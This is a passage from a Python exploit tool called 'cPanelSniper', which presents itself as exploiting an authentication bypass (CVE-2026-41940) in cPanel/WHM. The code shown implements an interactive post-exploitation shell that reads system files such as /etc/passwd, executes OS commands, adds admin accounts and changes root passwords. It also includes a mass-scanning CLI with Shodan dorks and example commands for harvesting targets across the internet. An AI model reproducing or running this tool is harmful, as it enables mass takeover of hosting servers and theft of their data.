                    continue
                content = action_read_file_direct(ctx, arg)
                if content:
                    print(f"{C.GREEN}{content[:2000]}{C.RESET}")
                else:
                    # Try direct HTTP fetch as last resort
                    scheme2, host2, port2, _, session_base2, token2, timeout2 = ctx
                    cookie_enc3 = quote(session_base2)
                    for ep in [
                        f"{token2}/execute/Fileman/get_file_content?dir=%2F&file={quote(arg.lstrip('/'))}",
                        f"{token2}/json-api/cpanel?cpanel_jsonapi_module=Fileman&cpanel_jsonapi_func=viewfile&dir=/&file={quote(arg)}",
                    ]:
                        url = build_url(scheme2, host2, port2, ep)
                        r4 = _do(url, extra_headers={"Cookie": f"whostmgrsession={cookie_enc3}"}, timeout=timeout2)
                        if r4.status == 200 and r4.body and len(r4.body) > 5:
                            print(f"{C.GREEN}{r4.body[:2000]}{C.RESET}")
                            break
                    else:
                        print(f"  {C.DIM}Cannot read {arg} — license blocks file access{C.RESET}")

            elif cmd == "ls":
                path = arg or "/"
                s, data = whm_api(*ctx[:6], "cpanel",
                    {"cpanel_jsonapi_module": "Fileman",
                     "cpanel_jsonapi_func":   "listfiles",
                     "dir": path}, timeout)
                if s == 200 and isinstance(data, dict):
                    files = data.get("cpanelresult",{}).get("data",[]) or []
                    for f in files[:40]:
                        ftype = "d" if f.get("type","f")=="dir" else "-"
                        print(f"  {ftype}  {f.get('file','?')}")
                else:
                    # Fallback: read /proc/self/fd for file listing
                    content = action_read_file_direct(ctx, "/etc/passwd")
                    if content:
                        print(f"  {C.DIM}(ls not available — /etc/passwd preview):{C.RESET}")
                        for line in content.split("\n")[:5]:
                            print(f"  {line}")

            elif cmd == "exec":
                if not arg:
                    print("  Usage: exec <command>")
                    continue
                action_exec_cmd(ctx, arg)

            elif cmd == "addadmin":
                parts2 = arg.split(None, 1)
                if len(parts2) < 2:
                    print("  Usage: addadmin <username> <password>")
                    continue
                action_add_admin(ctx, parts2[0], parts2[1])

            elif cmd == "passwd":
                if not arg:
                    print("  Usage: passwd <newpassword>")
                    continue
                action_change_passwd(ctx, arg)

            elif cmd == "api":
                # Raw API call: api endpoint [key=value ...]
                api_parts = arg.split(None, 1) if arg else []
                if not api_parts:
                    print("  Usage: api <endpoint> [key=value ...]")
                    continue
                ep     = api_parts[0]
                params = {}
                if len(api_parts) > 1:
                    for kv in api_parts[1].split():
                        if "=" in kv:
                            k, v = kv.split("=", 1)
                            params[k] = v
                s, data = whm_api(*ctx[:6], ep, params, timeout)
                print(f"  HTTP {s}")
                print(f"  {json.dumps(data, indent=2, default=str)[:1000]}")

            else:
                # Try as shell command
                action_exec_cmd(ctx, line)

        except KeyboardInterrupt:
            print(f"\n  {C.DIM}Ctrl+C — type 'exit' to quit{C.RESET}")
        except Exception as e:
            print(f"  {C.DIM}Error: {e}{C.RESET}")

# ══════════════════════════════════════════════════════════════
#  CLI
# ══════════════════════════════════════════════════════════════
ANSI_RE = re.compile(r"\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])")

def extract_url(line):
    clean = ANSI_RE.sub("", line).strip()
    m = re.search(r"(https?://[a-zA-Z0-9._:/?&=%-]+)", clean)
    if m: return m.group(1).rstrip("[].,")
    m2 = re.match(r"^(\d{1,3}(?:\.\d{1,3}){3})\s+(\d+)$", clean)
    if m2: return f"https://{m2.group(1)}:{m2.group(2)}"
    return None

def main():
    banner()
    p = argparse.ArgumentParser(
        description="cPanelSniper — CVE-2026-41940 cPanel/WHM Auth Bypass",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""
Shodan dorks:
  title:"WHM Login"
  title:"WebHost Manager" port:2087
  product:"cPanel" port:2087

Examples:
  python3 cPanelSniper.py -u https://target.com:2087
  python3 cPanelSniper.py -u https://target.com:2087 --action list
  python3 cPanelSniper.py -u https://target.com:2087 --action passwd --passwd P@ss2026!
  python3 cPanelSniper.py -u https://target.com:2087 --action cmd --cmd "id;whoami"
  python3 cPanelSniper.py -u https://target.com:2087 --action info
  python3 cPanelSniper.py -l targets.txt -t 20 -o results.json
  cat urls.txt | python3 cPanelSniper.py
  subfinder -d target.com | httpx -p 2087 -silent | python3 cPanelSniper.py
  shodan search --fields ip_str,port 'title:"WHM Login"' | \\
    awk '{print "https://"$1":"$2}' | python3 cPanelSniper.py -t 30
        """
    )
    tg = p.add_argument_group("Target")
    tg.add_argument("-u","--url",      help="Single target URL (e.g. https://host:2087)")
    tg.add_argument("-l","--list",     help="File with URLs (one per line)")
    tg.add_argument("--hostname",      help="Override canonical Host header (auto-discovered)")

    sg = p.add_argument_group("Scan")
    sg.add_argument("-t","--threads",  type=int, default=10, help="Threads (default: 10)")
    sg.add_argument("--timeout",       type=int, default=15, help="Timeout seconds (default: 15)")
    sg.add_argument("--rate-limit",    type=float, default=0, help="Delay between targets")

    ag = p.add_argument_group("Post-Exploit (single target only)")
    ag.add_argument("--action",  choices=["list","passwd","cmd","exec","info","version","shell","adduser"],
                    help="Post-exploit action (shell=interactive WHM shell)")
    ag.add_argument("--passwd",  help="New root password (--action passwd)")
    ag.add_argument("--cmd",     help="OS command to execute (--action cmd/exec)")
    ag.add_argument("--new-user",  help="New cPanel username (--action adduser)")
    ag.add_argument("--new-domain", help="New cPanel domain (--action adduser)")
    ag.add_argument("--read-file",  help="File path to read (--action exec)")

    og = p.add_argument_group("Output")
    og.add_argument("-o","--output",   help="Save results to JSON file")
    og.add_argument("--no-color",      action="store_true", help="Disable ANSI colors")

    args = p.parse_args()

    if args.no_color:
        for a in [x for x in dir(C) if not x.startswith("_")]:
            setattr(C, a, "")

    targets = []
    if args.url:   targets.append(args.url)
    if args.list:
        try:
            with open(args.list) as f:
                targets += [l.strip() for l in f if l.strip()]
        except FileNotFoundError:
            log("ERR", f"File not found: {args.list}"); sys.exit(1)
    if not sys.stdin.isatty():
        for line in sys.stdin:
            u = extract_url(line)
            if u: targets.append(u)
    if not targets:
        p.print_help(); sys.exit(1)

    targets = list(dict.fromkeys(targets))
    args.target_list = targets  # pass to scan()

    print(f"{C.PURPLE}  Configuration:{C.RESET}")
    print(f"   Targets  : {len(targets)}")
    print(f"   Threads  : {args.threads}")
    print(f"   Timeout  : {args.timeout}s")
    print(f"   Action   : {args.action or 'scan only'}")
    print()

    signal.signal(signal.SIGINT,
                  lambda s,f: (print_summary(time.time()-t0, len(targets)), sys.exit(0)))
    t0 = time.time()

    if len(targets) == 1:
        scan(targets[0], args)
    else:
        with ThreadPoolExecutor(max_workers=args.threads) as ex:
            futs = [ex.submit(scan, t, args) for t in targets]
            for _ in as_completed(futs):
                if args.rate_limit: time.sleep(args.rate_limit)

    print_summary(time.time()-t0, len(targets))
    if args.output:
        save_output(STORE.all(), args.output)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.RED}[!] Interrupted.{C.RESET}"); sys.exit(0)
